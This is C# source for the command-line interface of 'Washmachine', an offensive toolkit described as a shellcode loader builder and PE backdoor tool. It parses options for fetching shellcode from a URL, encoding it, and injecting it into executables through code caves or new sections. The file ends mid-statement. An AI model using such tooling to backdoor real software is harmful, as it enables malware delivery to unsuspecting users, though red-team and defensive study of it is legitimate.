using System.Globalization;
using System.Text;
using System.Text.Json;
using Spectre.Console;
using Washmachine.Logging;
using Washmachine.Models;
using Washmachine.Services;
using Washmachine.Testing;

namespace Washmachine.Cli;

public static class Program
{
    private static readonly JsonSerializerOptions JsonPrint = new() { WriteIndented = false };
    private static readonly Dictionary<string, List<string>> InputHistory = new(StringComparer.OrdinalIgnoreCase);
    private static readonly string[] RootReplCommands =
    {
        "compile", "analyze", "backdoor", "strip", "list", "provision", "test", "help",
        "banner", "clear", "cls", "exit", "quit", "q"
    };
    private static readonly string[] SubModeCommands = { "help", "back", "exit", "..", "q" };
    private static readonly string[] ListTargets = { "--templates", "--encoders", "--snippets", "--compilers" };
    private static readonly string[] ListTargetsBare = { "templates", "encoders", "snippets", "compilers" };
    private static readonly string[] BackdoorMethodValues = { "code-cave", "new-section", "section-ext" };
    private static readonly string[] BackdoorEncryptionValues = { "none" };
    private static readonly string[] BackdoorCarrierValues = { "entry-point" };
    private static readonly string[] StripModeValues = { "ep", "entry-point", "section", "all-exec", "range" };
    private static readonly Dictionary<string, string[]> CommandOptionCompletions = new(StringComparer.OrdinalIgnoreCase)
    {
        ["compile"] = new[]
        {
            "--shellcode", "-s", "--shellcode-hex", "--shellcode-url", "-u", "--template", "-t",
            "--encoder", "-e", "--envelope", "-v", "--snippet", "--verbose", "--json"
        },
        ["analyze"] = new[] { "--json" },
        ["backdoor"] = new[]
        {
            "--pe", "--shellcode", "-s", "--output", "-o", "--method", "-m", "--encryption", "--enc",
            "--xor-key", "--section-name", "--no-remove-sig", "--no-patch-subsystem", "--carrier",
            "--invoke", "--no-preserve-entry", "--no-patch-iat", "--no-patch-exit", "--cave-min-size",
            "--dry-run", "--verbose", "--json"
        },
        ["strip"] = new[] { "-o", "--output", "--mode", "-m", "--section", "--analyze", "--no-trim", "--range" },
        ["list"] = ListTargets,
        ["provision"] = Array.Empty<string>(),
        ["test"] = new[] { "--help", "-h" },
        ["help"] = new[] { "compile", "analyze", "backdoor", "strip", "list", "provision", "test" }
    };
    private static bool _isRepl;

    public static async Task<int> Main(string[] args)
    {
        Console.OutputEncoding = System.Text.Encoding.UTF8;
        Console.InputEncoding = System.Text.Encoding.UTF8;

        // One-shot mode: command provided on command line (e.g., from GUI or scripts)
        if (args.Length > 0)
        {
            return await DispatchAsync(args);
        }

        // Interactive REPL mode — Metasploit-style shell
        ShowBanner();
        return await RunReplAsync();
    }

    /// <summary>Dispatch a single command (one-shot or from REPL).</summary>
    private static async Task<int> DispatchAsync(string[] args)
    {
        bool jsonMode = args.Any(a => a == "--json");

        var command = args[0].ToLowerInvariant();
        var cmdArgs = args.Skip(1).ToArray();

        // Check if the command's first arg is a help flag
        bool wantsHelp = cmdArgs.Length > 0 && cmdArgs[0] is "help" or "--help" or "-h";

        return command switch
        {
            "compile"   => wantsHelp ? PrintCompileUsage() : await RunCompileAsync(cmdArgs),
            "analyze"   => wantsHelp ? PrintAnalyzeUsage() : await RunAnalyzeAsync(cmdArgs),
            "backdoor"  => wantsHelp ? PrintBackdoorUsage() : await RunBackdoorAsync(cmdArgs),
            "strip"     => wantsHelp ? PrintStripUsage() : await RunStripAsync(cmdArgs),
            "list"      => wantsHelp ? PrintListUsage() : await RunListAsync(cmdArgs),
            "provision" => wantsHelp ? PrintProvisionUsage() : await RunProvisionAsync(cmdArgs),
            "test"      => wantsHelp ? PrintTestUsage() : await TestHarness.RunAsync(cmdArgs),
            "help" or "--help" or "-h" => HandleHelp(cmdArgs),
            _ => PrintUnknownCommand(command),
        };
    }

    /// <summary>Route help to per-command help when a subcommand is specified.</summary>
    private static int HandleHelp(string[] args)
    {
        if (args.Length == 0) return PrintUsage();
        return args[0].ToLowerInvariant() switch
        {
            "compile"   => PrintCompileUsage(),
            "analyze"   => PrintAnalyzeUsage(),
            "backdoor"  => PrintBackdoorUsage(),
            "strip"     => PrintStripUsage(),
            "list"      => PrintListUsage(),
            "provision" => PrintProvisionUsage(),
            "test"      => PrintTestUsage(),
            _ => PrintUsage(),
        };
    }

    /// <summary>Interactive read-eval-print loop.</summary>
    private static async Task<int> RunReplAsync()
    {
        _isRepl = true;
        while (true)
        {
            AnsiConsole.WriteLine();
            string? input;
            try
            {
                input = ReadLineWithEditor("[cyan1]washmachine[/] [mediumpurple1]❯[/] ", "root");
            }
            catch (InvalidOperationException)
            {
                // Non-interactive terminal (piped input exhausted)
                break;
            }

            if (input is null)
                break;

            var line = input.Trim();
            if (string.IsNullOrEmpty(line))
                continue;

            switch (line.ToLowerInvariant())
            {
                case "exit" or "quit" or "q":
                    AnsiConsole.MarkupLine("[dim]Goodbye.[/]");
                    return 0;
                case "clear" or "cls":
                    AnsiConsole.Clear();
                    continue;
                case "banner":
                    ShowBanner();
                    continue;
                case "help" or "?" or "--help":
                    PrintUsage();
                    continue;
            }

            // Tokenize input (respecting quoted strings)
            var tokens = TokenizeLine(line);
            if (tokens.Length == 0) continue;

            try
            {
                await DispatchAsync(tokens);
            }
            catch (Exception ex)
            {
                AnsiConsole.MarkupLine($"[red]Error:[/] {Markup.Escape(ex.Message)}");
            }
        }

        return 0;
    }

    /// <summary>Split a command line into tokens, respecting double-quoted strings.</summary>
    private static string[] TokenizeLine(string line)
    {
        var tokens = new List<string>();
        var current = new StringBuilder();
        bool inQuote = false;

        foreach (char c in line)
        {
            if (c == '"')
            {
                inQuote = !inQuote;
            }
            else if (c == ' ' && !inQuote)
            {
                if (current.Length > 0)
                {
                    tokens.Add(current.ToString());
                    current.Clear();
                }
            }
            else
            {
                current.Append(c);
            }
        }

        if (current.Length > 0)
            tokens.Add(current.ToString());

        return tokens.ToArray();
    }

    /// <summary>Enter a sub-mode REPL for a given command when invoked with no args in REPL mode.</summary>
    private static async Task<int> RunSubMode(string modeName, Func<string[], Task<int>> handler, Func<int>? helpFunc = null)
    {
        if (!_isRepl)
        {
            helpFunc?.Invoke();
            return 1;
        }

        while (true)
        {
            AnsiConsole.WriteLine();
            string? input;
            try
            {
                input = ReadLineWithEditor(
                    $"[cyan1]washmachine[/] [mediumpurple1]{Markup.Escape(modeName)}[/] [mediumpurple1]>[/] ",
                    modeName,
                    modeName);
            }
            catch (InvalidOperationException) { break; }

            if (input is null) break;

            var cmd = input.Trim();
            if (string.IsNullOrEmpty(cmd)) continue;
            if (cmd.ToLowerInvariant() is "back" or "exit" or ".." or "q") break;
            if (cmd.ToLowerInvariant() is "help" or "?") { helpFunc?.Invoke(); continue; }

            var tokens = TokenizeLine(cmd);
            if (tokens.Length == 0) continue;

            try { await handler(tokens); }
            catch (Exception ex) { AnsiConsole.MarkupLine($"[red]Error:[/] {Markup.Escape(ex.Message)}"); }
        }
        return 0;
    }

    private static string? ReadLineWithEditor(string promptMarkup, string historyScope, string? fixedCommand = null)
    {
        if (Console.IsInputRedirected || Console.IsOutputRedirected)
            return Console.ReadLine();

        AnsiConsole.Markup(promptMarkup);

        int originLeft = Console.CursorLeft;
        int originTop = Console.CursorTop;
        int previousRenderLines = 1;
        int cursorIndex = 0;
        var buffer = new StringBuilder();
        var history = GetHistoryBucket(historyScope);
        int historyIndex = history.Count;
        string draft = string.Empty;

        void ReplaceBuffer(string value)
        {
            buffer.Clear();
            buffer.Append(value);
            cursorIndex = buffer.Length;
        }

        void Render()
        {
            int width = Math.Max(Console.BufferWidth, 1);
            int currentRenderLines = GetWrappedLineCount(originLeft, buffer.Length, width);
            int linesToClear = Math.Max(previousRenderLines, currentRenderLines);

            for (int i = 0; i < linesToClear; i++)
            {
                int left = i == 0 ? originLeft : 0;
                Console.SetCursorPosition(left, originTop + i);
                Console.Write(new string(' ', Math.Max(1, width - left)));
            }

            Console.SetCursorPosition(originLeft, originTop);
            Console.Write(buffer.ToString());

            previousRenderLines = currentRenderLines;

            int absoluteIndex = originLeft + cursorIndex;
            int cursorTop = originTop + (absoluteIndex / width);
            int cursorLeft = absoluteIndex % width;
            Console.SetCursorPosition(cursorLeft, cursorTop);
        }

        void ShowCompletionChoices(IReadOnlyList<string> matches)
        {
            AnsiConsole.WriteLine();
            foreach (var chunk in matches.Chunk(6))
                AnsiConsole.MarkupLine($"[dim]  {string.Join("  ", chunk.Select(Markup.Escape))}[/]");

            AnsiConsole.Markup(promptMarkup);
            originLeft = Console.CursorLeft;
            originTop = Console.CursorTop;
            previousRenderLines = 1;
            Render();
        }

        while (true)
        {
            ConsoleKeyInfo key;
            try
            {
                key = Console.ReadKey(intercept: true);
            }
            catch (InvalidOperationException)
            {
                Console.WriteLine();
                return buffer.ToString();
            }

            switch (key.Key)
            {
                case ConsoleKey.Enter:
                {
                    Console.WriteLine();
                    var line = buffer.ToString();
                    AddHistoryEntry(historyScope, line);
                    return line;
                }
                case ConsoleKey.LeftArrow:
                    if (cursorIndex > 0)
                    {
                        cursorIndex--;
                        Render();
                    }
                    break;
                case ConsoleKey.RightArrow:
                    if (cursorIndex < buffer.Length)
                    {
                        cursorIndex++;
                        Render();
                    }
                    break;
                case ConsoleKey.Home:
                    if (cursorIndex != 0)
                    {
                        cursorIndex = 0;
                        Render();
                    }
                    break;
                case ConsoleKey.End:
                    if (cursorIndex != buffer.Length)
                    {
                        cursorIndex = buffer.Length;
                        Render();
                    }
                    break;
                case ConsoleKey.Backspace:
                    if (cursorIndex > 0)
                    {
                        buffer.Remove(cursorIndex - 1, 1);
                        cursorIndex--;
                        historyIndex = history.Count;
                        Render();
                    }
                    break;
                case ConsoleKey.Delete:
                    if (cursorIndex < buffer.Length)
                    {
                        buffer.Remove(cursorIndex, 1);
                        historyIndex = history.Count;
                        Render();
                    }
                    break;
                case ConsoleKey.UpArrow:
                    if (history.Count > 0)
                    {
                        if (historyIndex == history.Count)
                            draft = buffer.ToString();

                        if (historyIndex > 0)
                        {
                            historyIndex--;
                            ReplaceBuffer(history[historyIndex]);
                            Render();
                        }
                    }
                    break;
                case ConsoleKey.DownArrow:
                    if (history.Count > 0)
                    {
                        if (historyIndex < history.Count - 1)
                        {
                            historyIndex++;
                            ReplaceBuffer(history[historyIndex]);
                            Render();
                        }
                        else if (historyIndex == history.Count - 1)
                        {
                            historyIndex = history.Count;
                            ReplaceBuffer(draft);
                            Render();
                        }
                    }
                    break;
                case ConsoleKey.Tab:
                {
                    var matches = GetCompletionMatches(fixedCommand, buffer.ToString(), cursorIndex, out int replaceStart, out int replaceEnd, out string currentPrefix);
                    if (matches.Count == 0)
                        break;

                    if (matches.Count == 1)
                    {
                        buffer.Remove(replaceStart, replaceEnd - replaceStart);
                        buffer.Insert(replaceStart, matches[0]);
                        cursorIndex = replaceStart + matches[0].Length;
                        historyIndex = history.Count;
                        Render();
                        break;
                    }

                    var commonPrefix = GetCommonPrefix(matches);
                    if (!string.IsNullOrEmpty(commonPrefix) && commonPrefix.Length > currentPrefix.Length)
                    {
                        buffer.Remove(replaceStart, replaceEnd - replaceStart);
                        buffer.Insert(replaceStart, commonPrefix);
                        cursorIndex = replaceStart + commonPrefix.Length;
                        historyIndex = history.Count;
                        Render();
                        break;
                    }

                    ShowCompletionChoices(matches);
                    break;
                }
                default:
                    if (key.Modifiers.HasFlag(ConsoleModifiers.Control) && key.Key == ConsoleKey.A)
                    {
                        if (cursorIndex != 0)
                        {
                            cursorIndex = 0;
                            Render();
                        }
                    }
                    else if (key.Modifiers.HasFlag(ConsoleModifiers.Control) && key.Key == ConsoleKey.E)
                    {
                        if (cursorIndex != buffer.Length)
                        {
                            cursorIndex = buffer.Length;
                            Render();
                        }
                    }
                    else if (!char.IsControl(key.KeyChar))
                    {
                        buffer.Insert(cursorIndex, key.KeyChar);
                        cursorIndex++;
                        historyIndex = history.Count;
                        Render();
                    }
                    break;
            }
        }
    }

    private static List<string> GetHistoryBucket(string historyScope)
    {
        if (!InputHistory.TryGetValue(historyScope, out var bucket))
        {
            bucket = new List<string>();
            InputHistory[historyScope] = bucket;
        }

        return bucket;
    }

    private static void AddHistoryEntry(string historyScope, string line)
    {
        if (string.IsNullOrWhiteSpace(line))
            return;

        var bucket = GetHistoryBucket(historyScope);
        if (bucket.Count == 0 || !string.Equals(bucket[^1], line, StringComparison.Ordinal))
            bucket.Add(line);

        const int maxHistoryEntries = 200;
        if (bucket.Count > maxHistoryEntries)
            bucket.RemoveAt(0);
    }

    private static IReadOnlyList<string> GetCompletionMatches(string? fixedCommand, string line, int cursorIndex, out int replaceStart, out int replaceEnd, out string currentPrefix)
    {
        GetCurrentWordSpan(line, cursorIndex, out replaceStart, out replaceEnd);

        string beforeCursor = line[..cursorIndex];
        var tokensBeforeCursor = TokenizeLine(beforeCursor);
        bool atTokenBoundary = cursorIndex == 0 || char.IsWhiteSpace(line[cursorIndex - 1]);
        currentPrefix = atTokenBoundary || tokensBeforeCursor.Length == 0 ? string.Empty : tokensBeforeCursor[^1];
        int currentTokenIndex = atTokenBoundary ? tokensBeforeCursor.Length : tokensBeforeCursor.Length - 1;

        IEnumerable<string> matches;
        if (fixedCommand is null)
        {
            if (currentTokenIndex == 0)
            {
                matches = FilterCompletionMatches(RootReplCommands, currentPrefix);
            }
            else
            {
                string command = tokensBeforeCursor[0].ToLowerInvariant();
                matches = GetCommandCompletionMatches(command, tokensBeforeCursor.Skip(1).ToArray(), currentTokenIndex - 1, currentPrefix, includeSubModeCommands: false);
            }
        }
        else
        {
            matches = GetCommandCompletionMatches(fixedCommand, tokensBeforeCursor, currentTokenIndex, currentPrefix, includeSubModeCommands: true);
        }

        return matches.ToArray();
    }

    private static IEnumerable<string> GetCommandCompletionMatches(string command, string[] argTokens, int currentArgIndex, string currentPrefix, bool includeSubModeCommands)
    {
        if (command.Equals("help", StringComparison.OrdinalIgnoreCase))
            return currentArgIndex == 0 ? FilterCompletionMatches(CommandOptionCompletions["help"], currentPrefix) : Array.Empty<string>();

        string? previousToken = GetPreviousToken(argTokens, currentArgIndex);
        var valueCandidates = GetOptionValueCandidates(command, previousToken);
        if (valueCandidates.Length > 0)
            return FilterCompletionMatches(valueCandidates, currentPrefix);

        if (command.Equals("list", StringComparison.OrdinalIgnoreCase) && currentArgIndex == 0)
        {
            var listCandidates = currentPrefix.StartsWith("-", StringComparison.Ordinal)
                ? ListTargets
                : ListTargetsBare.Concat(ListTargets).ToArray();
            return FilterCompletionMatches(listCandidates, currentPrefix);
        }

        var candidates = new List<string>();
        if (includeSubModeCommands && currentArgIndex == 0)
            candidates.AddRange(SubModeCommands);

        if (CommandOptionCompletions.TryGetValue(command, out var options))
            candidates.AddRange(options);

        return FilterCompletionMatches(candidates, currentPrefix);
    }

    private static string[] GetOptionValueCandidates(string command, string? previousToken)
    {
        if (string.IsNullOrEmpty(previousToken))
            return Array.Empty<string>();

        return command.ToLowerInvariant() switch
        {
            "backdoor" when previousToken is "--method" or "-m" => BackdoorMethodValues,
            "backdoor" when previousToken is "--encryption" or "--enc" => BackdoorEncryptionValues,
            "backdoor" when previousToken is "--carrier" or "--invoke" => BackdoorCarrierValues,
            "strip" when previousToken is "--mode" or "-m" => StripModeValues,
            _ => Array.Empty<string>()
        };
    }

    private static IEnumerable<string> FilterCompletionMatches(IEnumerable<string> candidates, string prefix)
    {
        return candidates
            .Where(c => string.IsNullOrEmpty(prefix) || c.StartsWith(prefix, StringComparison.OrdinalIgnoreCase))
            .Distinct(StringComparer.OrdinalIgnoreCase)
            .OrderBy(c => c, StringComparer.OrdinalIgnoreCase);
    }

    private static string? GetPreviousToken(string[] argTokens, int currentArgIndex)
    {
        if (argTokens.Length == 0)
            return null;

        if (currentArgIndex >= argTokens.Length)
            return argTokens[^1];

        return currentArgIndex > 0 ? argTokens[currentArgIndex - 1] : null;
    }

    private static void GetCurrentWordSpan(string line, int cursorIndex, out int start, out int end)
    {
        start = cursorIndex;
        while (start > 0 && !char.IsWhiteSpace(line[start - 1]))
            start--;

        end = cursorIndex;
        while (end < line.Length && !char.IsWhiteSpace(line[end]))
            end++;
    }

    private static int GetWrappedLineCount(int originLeft, int textLength, int consoleWidth)
    {
        if (consoleWidth <= 0)
            return 1;

        if (textLength == 0)
            return 1;

        return ((originLeft + textLength) / consoleWidth) + 1;
    }

    private static string GetCommonPrefix(IReadOnlyList<string> values)
    {
        if (values.Count == 0)
            return string.Empty;

        string prefix = values[0];
        for (int i = 1; i < values.Count; i++)
        {
            int max = Math.Min(prefix.Length, values[i].Length);
            int len = 0;
            while (len < max && char.ToUpperInvariant(prefix[len]) == char.ToUpperInvariant(values[i][len]))
                len++;

            prefix = prefix[..len];
            if (prefix.Length == 0)
                break;
        }

        return prefix;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  Banner
    // ═══════════════════════════════════════════════════════════════════════

    private static void ShowBanner()
    {
        // Figlet banner
        AnsiConsole.Write(new FigletText("WASHMACHINE").Color(Color.Cyan1));

        // Typing effect for tagline
        var tagline = "Shellcode Loader Builder & PE Backdoor Toolkit";
        var dimStyle = new Style(Color.Grey69, decoration: Decoration.Italic);
        foreach (char c in tagline)
        {
            AnsiConsole.Write(new Text(c.ToString(), dimStyle));
            Thread.Sleep(8);
        }
        AnsiConsole.WriteLine();
        AnsiConsole.WriteLine();

        // Info bar
        AnsiConsole.Write(new Rule().RuleStyle("grey42"));
        var grid = new Grid()
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap());
        grid.AddRow(
            "[bold white]v1.0.0[/]",
            "[dim]|[/]",
            "[bold cyan1 link=https://github.com/0xhmza]github.com/0xhmza[/]",
            "[dim]|[/]",
            "[gold1]For educational & authorized testing only[/]"
        );
        AnsiConsole.Write(grid);
        AnsiConsole.Write(new Rule().RuleStyle("grey42"));
        AnsiConsole.WriteLine();

        AnsiConsole.MarkupLine("[dim]Type[/] [cyan1]help[/] [dim]for commands,[/] [cyan1]help <command>[/] [dim]for details[/]");
        AnsiConsole.MarkupLine("[dim]Keys:[/] [cyan1]↑/↓[/] history  [cyan1]←/→[/] move  [cyan1]Home/End[/] jump  [cyan1]Tab[/] complete");
        AnsiConsole.WriteLine();
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  compile
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunCompileAsync(string[] args)
    {
        if (args.Length == 0)
            return await RunSubMode("compile", RunCompileAsync, PrintCompileUsage);

        string? shellcodeFile = null;
        string? shellcodeHex = null;
        string? shellcodeUrl = null;
        string? templateId = null;
        string? encoderIndex = null;
        string? envelopeIndex = null;
        var snippets = new Dictionary<string, string>();
        bool verbose = false;
        bool jsonOutput = false;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--shellcode" or "-s" when i + 1 < args.Length:
                    shellcodeFile = args[++i]; break;
                case "--shellcode-hex" when i + 1 < args.Length:
                    shellcodeHex = args[++i]; break;
                case "--shellcode-url" or "-u" when i + 1 < args.Length:
                    shellcodeUrl = args[++i]; break;
                case "--template" or "-t" when i + 1 < args.Length:
                    templateId = args[++i]; break;
                case "--encoder" or "-e" when i + 1 < args.Length:
                    encoderIndex = args[++i]; break;
                case "--envelope" or "-v" when i + 1 < args.Length:
                    envelopeIndex = args[++i]; break;
                case "--snippet" when i + 1 < args.Length:
                    var kv = args[++i].Split('=', 2);
                    if (kv.Length == 2) snippets[kv[0]] = kv[1];
                    break;
                case "--verbose": verbose = true; break;
                case "--json": jsonOutput = true; break;
                default:
                    AnsiConsole.MarkupLine($"[red]Error:[/] Unknown option: {Markup.Escape(args[i])}");
                    return 1;
            }
        }

        if (shellcodeFile == null && shellcodeHex == null && shellcodeUrl == null)
        {
            AnsiConsole.MarkupLine("[red]Error:[/] provide --shellcode <file>, --shellcode-hex <hex>, or --shellcode-url <url>");
            return 1;
        }

        var logger = new ConsoleLogger();
        if (verbose) logger.VerboseEnabled = true;

        var paths = new AppPaths();

        // Ensure requirements (Bin2Shell) before compilation
        var provisioner = new RequirementProvisioner(paths, logger);
        await provisioner.EnsureRequirementsAsync(new ConsoleProgressReporter());

        var runner = new Bin2ShellRunner(paths);
        var snippetService = new YamlCodeSnippetCatalogService(paths);
        var toolLocator = new CompilerToolLocator(logger);
        var compiler = new CompilerService(paths, runner, snippetService, toolLocator, logger);

        // Build UiData from CLI arguments
        var textBoxes = new Dictionary<string, string>
        {
            ["shellcodeFile"] = shellcodeFile ?? "",
            ["shellcodeRAW"] = shellcodeHex ?? "",
            ["shellcodeURL"] = shellcodeUrl ?? "",
            ["shellcodeURLFile"] = "",
        };

        var comboBoxes = new Dictionary<string, string>
        {
            ["templateComboBox"] = templateId ?? "shellcode-minimal",
        };

        // Resolve encoder/envelope display text from catalog
        var encodingCatalog = new ShellcodeEncodingCatalogService(runner, paths);
        try
        {
            var catalog = await encodingCatalog.GetCatalogAsync();

            if (encoderIndex != null && int.TryParse(encoderIndex, out int encIdx))
            {
                var enc = catalog.Encoders.FirstOrDefault(e => e.Index == encIdx);
                comboBoxes["bin2hexEncoder"] = enc?.DisplayText ?? $"{encIdx} - custom";
            }
            else
            {
                comboBoxes["bin2hexEncoder"] = "0 - none";
            }

            if (envelopeIndex != null && int.TryParse(envelopeIndex, out int envIdx))
            {
                var env = catalog.Envelopes.FirstOrDefault(e => e.Index == envIdx);
                comboBoxes["bin2hexEnvelope"] = env?.DisplayText ?? $"{envIdx} - custom";
            }
            else
            {
                comboBoxes["bin2hexEnvelope"] = "0 - none";
            }
        }
        catch (Exception ex)
        {
            logger.Warn($"Could not load encoding catalog: {ex.Message}");
            comboBoxes["bin2hexEncoder"] = encoderIndex != null ? $"{encoderIndex} - custom" : "0 - none";
            comboBoxes["bin2hexEnvelope"] = envelopeIndex != null ? $"{envelopeIndex} - custom" : "0 - none";
        }

        // Apply snippet selections and defaults
        foreach (var kv in snippets)
            comboBoxes[$"snippetCombo_{kv.Key}_0"] = kv.Value;

        // Apply default snippets for the selected template
        if (snippetService.TryGetTemplate(comboBoxes["templateComboBox"], out var tmpl))
        {
            foreach (var ph in tmpl.Placeholders.Where(p => p.Kind == TemplatePlaceholderKind.Snippet))
            {
                if (!snippetService.TryResolveSection(ph.SnippetTemplateKey, out var section))
                    continue;
                string comboName = $"snippetCombo_{ph.SnippetTemplateKey}_0";
                if (!comboBoxes.ContainsKey(comboName))
                {
                    var defaultItem = section.Items.FirstOrDefault(si => si.IsDefault)
                                      ?? section.Items.FirstOrDefault();
                    if (defaultItem != null)
                        comboBoxes[comboName] = defaultItem.Id;
                }
            }

            // Apply default input values
            foreach (var section in snippetService.GetAllSections())
            {
                foreach (var input in section.Inputs)
                {
                    if (!string.IsNullOrWhiteSpace(input.DefaultValue) && !textBoxes.ContainsKey(input.Id))
                        textBoxes[input.Id] = input.DefaultValue;
                }
            }
        }

        var data = new UiData(textBoxes, comboBoxes);

        try
        {
            var result = jsonOutput
                ? await compiler.CompileAsync(data)
                : await AnsiConsole.Status()
                    .Spinner(Spinner.Known.Dots)
                    .SpinnerStyle(Style.Parse("cyan"))
                    .StartAsync("Compiling...", async _ => await compiler.CompileAsync(data));

            if (jsonOutput)
            {
                var output = new
                {
                    result.Success,
                    result.OutputExePath,
                    result.GeneratedSourcePath,
                    Notes = result.Notes,
                    CompilerPath = result.Discovery?.Best?.Path,
                    ConversionSuccess = result.ConversionResult.Success,
                    ConversionError = result.ConversionResult.Error,
                };
                Console.WriteLine(JsonSerializer.Serialize(output, JsonPrint));
            }
            else
            {
                foreach (var note in result.Notes)
                    logger.Info(note);

                if (result.Success)
                {
                    AnsiConsole.Write(new Panel("[green3_1]Compilation succeeded.[/]")
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                }
                else
                {
                    AnsiConsole.Write(new Panel($"[red]Compilation failed: {Markup.Escape(result.ConversionResult.Error ?? "unknown")}[/]")
                        .BorderColor(Color.Red)
                        .Border(BoxBorder.Rounded));
                }
            }

            return result.Success ? 0 : 1;
        }
        catch (Exception ex)
        {
            logger.Error($"Fatal: {ex.Message}");
            return 1;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  analyze
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunAnalyzeAsync(string[] args)
    {
        if (args.Length == 0)
            return await RunSubMode("analyze", RunAnalyzeAsync, PrintAnalyzeUsage);

        if (args[0] is "help" or "--help" or "-h")
        {
            PrintAnalyzeUsage();
            return 0;
        }

        var peFile = args[0];
        if (!File.Exists(peFile))
        {
            AnsiConsole.MarkupLine($"[red]Error:[/] File not found: {Markup.Escape(peFile)}");
            return 1;
        }

        bool jsonOutput = args.Contains("--json");
        var logger = new ConsoleLogger();
        var analyzer = new PeAnalyzerService(logger);

        try
        {
            var result = await analyzer.AnalyzeAsync(peFile);

            if (jsonOutput)
            {
                Console.WriteLine(JsonSerializer.Serialize(result, JsonPrint));
                return 0;
            }

            // ══════════════════════════════════════════════════════════
            //  DASHBOARD HEADER
            // ══════════════════════════════════════════════════════════
            string peTypeStr = result.IsDriver ? "Driver" : result.IsDll ? "DLL" : "EXE";
            string archShort = result.Is64Bit ? "x64" : "x86";

            var headerMarkup = new Markup(
                $"[bold cyan1]\U0001f52c PE ANALYSIS REPORT[/]\n" +
                $"[grey63]{new string('\u2500', 60)}[/]\n" +
                $"[cyan1]File:[/] [white]{Markup.Escape(result.FileName ?? Path.GetFileName(peFile))}[/]     " +
                $"[cyan1]Size:[/] [white]{Markup.Escape(result.FileSizeFormatted ?? $"{result.FileSize:N0} bytes")}[/]     " +
                $"[cyan1]Type:[/] [white]{peTypeStr} {archShort}[/]");

            AnsiConsole.Write(new Panel(headerMarkup)
                .Border(BoxBorder.Heavy)
                .BorderColor(Color.Cyan1)
                .Expand());
            AnsiConsole.WriteLine();

            // ══════════════════════════════════════════════════════════
            //  FILE OVERVIEW + SECURITY SIDE-BY-SIDE
            // ══════════════════════════════════════════════════════════
            var overviewLines = new List<string>
            {
                $"[cyan1]File Name:[/]     [white]{Markup.Escape(result.FileName ?? "")}[/]",
                $"[cyan1]Size:[/]          [white]{Markup.Escape(result.FileSizeFormatted ?? $"{result.FileSize:N0} bytes")}[/]",
                $"[cyan1]SHA-256:[/]       [grey63]{Markup.Escape(result.FileHash ?? "N/A")}[/]",
                $"[cyan1]Architecture:[/]  [white]{Markup.Escape(result.Architecture)}[/]",
                $"[cyan1]Subsystem:[/]     [white]{Markup.Escape(result.OptionalHeader?.SubsystemString ?? "N/A")}[/]",
                $"[cyan1]Compiled:[/]      [white]{Markup.Escape(result.CompileTimeFormatted ?? "N/A")}[/]",
                $"[cyan1]Linker:[/]        [white]{Markup.Escape(result.OptionalHeader?.LinkerVersion ?? "N/A")}[/]",
                $"[cyan1].NET:[/]          {(result.IsDotNet ? "[gold1]Yes[/]" : "[white]No[/]")}",
            };

            var overviewPanel = new Panel(new Markup(string.Join("\n", overviewLines)))
                .Header("[bold cyan1]File Overview[/]")
                .Border(BoxBorder.Rounded)
                .BorderColor(Color.Grey42)
                .Expand();

            // Security panel
            var secContent = new List<string>();
            if (result.Security != null)
            {
                var sec = result.Security;
                string scoreColor = sec.SecurityScore < 40 ? "red1" : sec.SecurityScore < 70 ? "gold1" : "green3_1";
                string scoreBar = BuildUsageBar(sec.SecurityScore);
                secContent.Add($"[cyan1]Score:[/] {scoreBar} [{scoreColor}]{sec.SecurityScore}/100[/]");
                if (!string.IsNullOrEmpty(sec.SecurityAssessment))
                    secContent.Add($"[cyan1]Assessment:[/] [{scoreColor}]{Markup.Escape(sec.SecurityAssessment)}[/]");
                secContent.Add("");

                static string FlagL(bool on, string name)
                {
                    string padded = name.PadRight(16);
                    return on ? $"[green3_1]\u2713[/] {padded}" : $"[red1]\u2717[/] [grey63]{padded}[/]";
                }
                static string FlagR(bool on, string name)
                {
                    return on ? $"[green3_1]\u2713[/] {name}" : $"[red1]\u2717[/] [grey63]{name}[/]";
                }

                secContent.Add($"{FlagL(sec.HasAslr, "ASLR")}{FlagR(sec.HasDep, "DEP/NX")}");
                secContent.Add($"{FlagL(sec.HasHighEntropyVa, "High Entropy")}{FlagR(sec.HasCfg, "CFG")}");
                secContent.Add($"{FlagL(sec.HasSeh, "SEH")}{FlagR(sec.HasSafeSeh, "SafeSEH")}");
                secContent.Add($"{FlagL(sec.HasRfg, "RFG")}{FlagR(sec.HasAuthenticode, "Authenticode")}");
            }
            else
            {
                secContent.Add("[grey63]No security data available[/]");
            }

            var securityPanel = new Panel(new Markup(string.Join("\n", secContent)))
                .Header("[bold cyan1]Security[/]")
                .Border(BoxBorder.Rounded)
                .BorderColor(Color.Grey42)
                .Expand();

            AnsiConsole.Write(new Columns(overviewPanel, securityPanel));
            AnsiConsole.WriteLine();

            // ══════════════════════════════════════════════════════════
            //  PE HEADERS
            // ══════════════════════════════════════════════════════════
            AnsiConsole.Write(new Rule("[bold dodgerblue2]PE Headers[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
            AnsiConsole.WriteLine();

            if (result.OptionalHeader != null)
            {
                var oh = result.OptionalHeader;
                AnsiConsole.MarkupLine(
                    $"  [cyan1]Entry Point:[/] [mediumpurple1]0x{oh.AddressOfEntryPoint:X8}[/]    " +
                    $"[cyan1]Image Base:[/] [mediumpurple1]0x{oh.ImageBase:X}[/]    " +
                    $"[cyan1]Checksum:[/] [mediumpurple1]0x{oh.Checksum:X8}[/]");
                AnsiConsole.MarkupLine(
                    $"  [cyan1]Section Align:[/] [mediumpurple1]0x{oh.SectionAlignment:X}[/]    " +
                    $"[cyan1]File Align:[/] [mediumpurple1]0x{oh.FileAlignment:X}[/]    " +
                    $"[cyan1]Size of Image:[/] [mediumpurple1]0x{oh.SizeOfImage:X}[/]");

                if (oh.DllCharacteristicsList.Count > 0)
